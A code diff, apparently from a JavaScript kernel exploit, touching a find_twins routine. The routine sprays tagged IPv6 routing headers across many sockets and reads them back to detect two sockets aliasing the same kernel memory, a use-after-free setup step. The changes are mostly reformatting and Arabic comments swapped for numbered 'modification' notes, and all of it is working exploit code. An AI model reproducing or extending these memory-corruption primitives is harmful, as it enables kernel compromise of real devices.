@@ -778,21 +778,12 @@ function find_twins() {
   var count = 0;
   var val, i, j;
   var zeroMemoryCount = 0;
-
   twins[0] = -1;
   twins[1] = -1;
-
   var spray_add = spray_rthdr.add(0x04);
-  var leak_add  = leak_rthdr.add(0x04);
-
+  var leak_add = leak_rthdr.add(0x04);
   while (count < MAX_ROUNDS_TWIN) {
-
-    // مراقبة حالة الذاكرة (نفس الاسماء)
-    if (typeof debugging !== 'undefined' &&
-        debugging.info &&
-        debugging.info.memory &&
-        debugging.info.memory.available === 0) {
-
+    if (typeof debugging !== 'undefined' && debugging.info && debugging.info.memory && debugging.info.memory.available === 0) {
       zeroMemoryCount++;
       if (zeroMemoryCount >= 5) {
         cleanup();
@@ -801,42 +792,29 @@ function find_twins() {
     } else {
       zeroMemoryCount = 0;
     }
-
-    // المرحلة الأولى: الكتابة + set_rthdr
     for (i = 0; i < ipv6_socks.length; i++) {
-      if (ipv6_socks[i].eq(BigInt_Error)) continue;
+      if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6
 
       write32(spray_add, RTHDR_TAG | i);
-      read32(spray_add); // memory barrier كما كانت
+      read32(spray_add); // تعديل رقم 2 (memory barrier)
 
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
     }
-
-    // المرحلة الثانية: leak + البحث عن التوأم
     for (i = 0; i < ipv6_socks.length; i++) {
       if (ipv6_socks[i].eq(BigInt_Error)) continue;
-
-      write32(leak_add, 0);
+      write32(leak_add, 0); // تعديل رقم 4
       get_rthdr(ipv6_socks[i], leak_rthdr, 8);
-
       val = read32(leak_add);
-      j   = val & 0xFFFF;
-
-      if ((val & 0xFFFF0000) === RTHDR_TAG &&
-          i !== j &&
-          j >= 0 &&
-          j < ipv6_socks.length) {
-
+      j = val & 0xFFFF;
+      if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j >= 0 && j < ipv6_socks.length) {
         twins[0] = i;
         twins[1] = j;
         log(' TWINS : [' + i + '] [' + j + ']');
         return true;
       }
     }
-
     count++;
   }
-
   twins[0] = -1;
   twins[1] = -1;
   return false;
